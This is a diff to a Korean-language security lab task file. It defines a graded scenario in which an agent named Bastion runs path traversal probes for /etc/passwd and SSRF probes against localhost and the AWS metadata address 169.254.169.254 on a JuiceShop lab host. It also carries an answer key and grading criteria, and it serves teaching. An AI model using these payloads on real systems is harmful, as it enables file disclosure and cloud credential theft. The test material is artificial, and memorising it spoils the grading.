@@ -141,6 +141,7 @@ steps:
     - 완료
     - 10.20.30.80
     - /IPS
+    - '403'
     field: stdout
     semantic:
       intent: 클라우드 메타데이터 접근 — 169.254.169.254(AWS IMDS) 또는 metadata.google.internal
@@ -551,53 +552,107 @@ steps:
   risk_level: low
   bastion_prompt: SSRF 실습 종합 보고서를 작성하시오.
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "서버 측 신뢰 경계 침범 — Path Traversal + SSRF + Command Injection 비교"
 
-    1) 10.20.30.80 대상으로 SSRF 취약점 포인트 식별을(를) 수행해줘
+    ## 상황 (w06 → w07 시나리오 연속)
 
-    2) 10.20.30.80 대상으로 내부 네트워크 포트 스캔을(를) 수행해줘
+    w06 에서 JWT chain 공격을 봤다. 이번 주는 *서버 측* 침범.
 
-    3) 10.20.30.80 대상으로 localhost 서비스 접근 테스트을(를) 수행해줘
+    > 선배: "Path Traversal, SSRF, Command Injection — 표면은 다른데, 모두 *서버 신뢰 경계*를 깨는 거야.
+    > Path 는 파일시스템 경계, SSRF 는 네트워크 경계, Command 는 OS 셸 경계.
+    > 셋 다 사용자 입력이 그대로 서버 자원에 박혀버린 거지. 비교 점검하고 매트릭스 정리해.
+    > 클라우드 환경에선 SSRF 로 메타데이터 (169.254.169.254) 접근이 *Critical* 한 거 알지?"
 
-    4) 10.20.30.80 대상으로 클라우드 메타데이터 접근 시도을(를) 수행해줘
+    학습 목표 (lecture #2 Path Traversal + #3 Command Injection) + (lab #1·#3·#4·#10 SSRF) 통합.
 
-    5) 10.20.30.80 대상으로 프로토콜 스키마 변경 테스트을(를) 수행해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## 임무 (3 단계, 약 35분)
+
+    ### Phase A — Path Traversal 점검 (lecture #2)
+    JuiceShop 의 파일 다운로드 또는 정적 자원 엔드포인트 (예: `/ftp/<file>`) 대상.
+    `for p in '../etc/passwd' '....//etc/passwd' '%2e%2e%2fetc%2fpasswd'; do
+       curl -s "http://10.20.30.80/ftp/$p" | head -c 200 | head -1; echo "---"; done`
+    ../, ....//, URL 인코딩 3 우회 비교. 응답에 root: 등 /etc/passwd 내용이 보이면 취약.
+
+    ### Phase B — SSRF + 클라우드 메타데이터 (lab #1·#3·#4·#10)
+    JuiceShop 의 URL 허용 엔드포인트 (예: `/redirect?to=`) 대상 SSRF 시도.
+    - localhost: `curl "http://10.20.30.80/redirect?to=http://127.0.0.1:22"`
+    - 클라우드 메타데이터: `curl "http://10.20.30.80/redirect?to=http://169.254.169.254/latest/meta-data/"`
+      (실 환경 차단됨 — 시도와 차단 응답 자체가 학습 결과)
+    - DNS 우회: `curl "http://10.20.30.80/redirect?to=http://[::1]:8080/"` (IPv6 표기)
+
+    ### Phase C — 신뢰 경계 매트릭스 + 공통 방어
+    | 취약점 | 침범 경계 | 입력 위치 | 핵심 방어 | 잔존 위험 |
+    | Path Traversal | 파일시스템 | 파일명/경로 | basename + chroot | symlink |
+    | SSRF | 네트워크 | URL | URL allowlist + DNS pin | DNS rebinding |
+    | Command Injection | OS shell | shell metachar | exec(args[]) + arg quoting | env injection |
+    | XXE | 파일+네트워크 | XML 외부 entity | disable external entity | zip slip |
+    표 끝에 "공통 원칙: 서버 측 신뢰 경계는 *명시적 allowlist* + *sandbox*. blocklist 는 항상 우회됨" 한 줄.
+
+    종료: echo "=== Phase A Path ===" / "=== Phase B SSRF ===" / "=== Phase C 매트릭스 ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w07 신뢰 경계 침범 비교]
+
+    JuiceShop (http://10.20.30.80) 대상 Path Traversal + SSRF + 매트릭스 3 phase.
+
+    Phase A (Path Traversal):
+    `for p in '../etc/passwd' '....//etc/passwd' '%2e%2e%2fetc%2fpasswd'; do
+       echo "=== $p ==="; curl -s "http://10.20.30.80/ftp/$p" | head -c 200; echo; done`
+    실제 차단되어도 시도 자체와 응답 코드가 학습.
+
+    Phase B (SSRF + 메타데이터):
+    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://127.0.0.1:22"`
+    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://169.254.169.254/latest/meta-data/"`
+    `curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80/redirect?to=http://[::1]:8080/"`
+    각 응답 status code (200/302/403) 캡처. JuiceShop 의 redirect 차단 정책 분석.
+
+    Phase C (매트릭스):
+    ```
+    | 취약점 | 침범 경계 | 입력 위치 | 핵심 방어 | 잔존 위험 |
+    | Path Traversal | 파일시스템 | 파일명/경로 | basename + chroot | symlink |
+    | SSRF | 네트워크 | URL | URL allowlist + DNS pin | DNS rebinding |
+    | Command Injection | OS shell | shell metachar | exec(args[]) + arg quoting | env injection |
+    | XXE | 파일+네트워크 | XML 외부 entity | disable external entity | zip slip |
+    ```
+    표 끝에 "공통 원칙: 서버 측 신뢰 경계는 *명시적 allowlist* + *sandbox*. blocklist 는 항상 우회됨" 한 줄.
+
+    종료: echo "=== Phase A Path ===" / "=== Phase B SSRF ===" / "=== Phase C 매트릭스 ===" 묶음.
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: ../, ....//, %2e%2e%2f 3 우회. /ftp/ 엔드포인트는 JuiceShop allowlist 검증 시연.
+    Phase B: 169.254.169.254 는 AWS 메타데이터. JuiceShop 은 SSRF 차단 — 시도 자체가 학습.
+    Phase C: 4행 매트릭스 + 공통 원칙.
+    포인트: 표면 다른 3 취약점이 *모두 신뢰 경계 침범* 이라는 통합 시각.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: 매트릭스
     field: stdout
     semantic:
-      intent: '[통합] SSRF 5작업 — internal/cloud metadata/blind/filter bypass/audit 통합.
-        OWASP A10.'
+      intent: |
+        Path Traversal + SSRF + 클라우드 메타데이터 접근 시도 + 신뢰 경계 침범 매트릭스.
+        lecture #2·#3 + lab #1·#3·#4·#10 동시 행동 증명.
       success_criteria:
-      - 5 SSRF 작업
-      - metadata 접근
-      - bypass
+      - Phase A — Path Traversal 3 우회 (../, ....//, URL 인코딩) 시도 + 응답
+      - Phase B — SSRF 3 케이스 (localhost / 메타데이터 / IPv6) 시도 + status code
+      - Phase C — 4행 매트릭스 + 공통 원칙 한 줄
       acceptable_methods:
-      - bastion plan
-      - Burp Collaborator
-      - curl
+      - curl loop + head
+      - curl -w "%{http_code}"
+      - markdown table
+      - gobuster / wfuzz 추가 가능
       negative_signs:
-      - metadata 실패
-      - bypass 없음
-      - audit 누락
+      - Path 1 우회만
+      - SSRF 1 케이스만
+      - 매트릭스 누락
+      - 신뢰 경계 통합 관점 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) 10.20.30.80 대상으로 SSRF 취약점 포인트 식별을(를) 수행해줘
-
-    2) 10.20.30.80 대상으로 내부 네트워크 포트 스캔을(를) 수행해줘
-
-    3) 10.20.30.80 대상으로 localhost 서비스 접근 테스트을(를) 수행해줘
-
-    4) 10.20.30.80 대상으로 클라우드 메타데이터 접근 시도을(를) 수행해줘
-
-    5) 10.20.30.80 대상으로 프로토콜 스키마 변경 테스트을(를) 수행해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. Path 3 우회 → SSRF 3 케이스 → 매트릭스 echo.
+  answer_detail: |
+    JuiceShop 은 LFI·SSRF 차단 정책 적용됨 — 시도 자체와 차단 응답 코드 (403/302) 가 학습 결과.
+    169.254.169.254 는 AWS EC2 메타데이터 IP. 클라우드 환경에서 SSRF 의 가장 큰 위협.
   script: ''
